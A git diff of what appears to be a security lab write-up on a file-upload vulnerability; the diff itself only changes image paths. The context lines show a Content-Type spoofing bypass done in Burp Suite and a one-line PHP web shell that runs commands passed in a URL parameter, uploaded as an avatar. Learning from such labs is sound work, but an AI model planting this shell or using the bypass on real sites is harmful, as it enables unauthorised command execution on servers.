@@ -10,7 +10,7 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 So upon logging in my account, I can see the avatar upload field.
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20240719144326.png" alt=""><figcaption><p>upload field for avatar</p></figcaption></figure>
+<figure><img src="/.gitbook/assets/Pasted image 20240719144326.png" alt=""><figcaption><p>upload field for avatar</p></figcaption></figure>
 
 Testing this functionality by uploading an empty `test.txt` file gives me an error
 
@@ -18,13 +18,13 @@ Testing this functionality by uploading an empty `test.txt` file gives me an err
 
 The next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change `Content-Type: Text/Plain` to `Content-Type: image/jpeg`. This bypassed a defense mechanism and as a result it let me upload a text file
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20240719145007.png" alt=""><figcaption><p>demonstration of tricking web application into uploading different type of file</p></figcaption></figure>
+<figure><img src="/.gitbook/assets/Pasted image 20240719145007.png" alt=""><figcaption><p>demonstration of tricking web application into uploading different type of file</p></figcaption></figure>
 
 Now it's time to upload a web shell `mal.php` with the following contents:
 
 `<?php echo system($_GET['command']); ?>`
 
-<figure><img src="../../../.gitbook/assets/Pasted image 20240719145330.png" alt=""><figcaption><p>uploaded malware of type php</p></figcaption></figure>
+<figure><img src="/.gitbook/assets/Pasted image 20240719145330.png" alt=""><figcaption><p>uploaded malware of type php</p></figcaption></figure>
 
 Now, since I know that this `mal.php` is uploaded in `/files/avatars/mal.php`, I can call it using CURL.
 
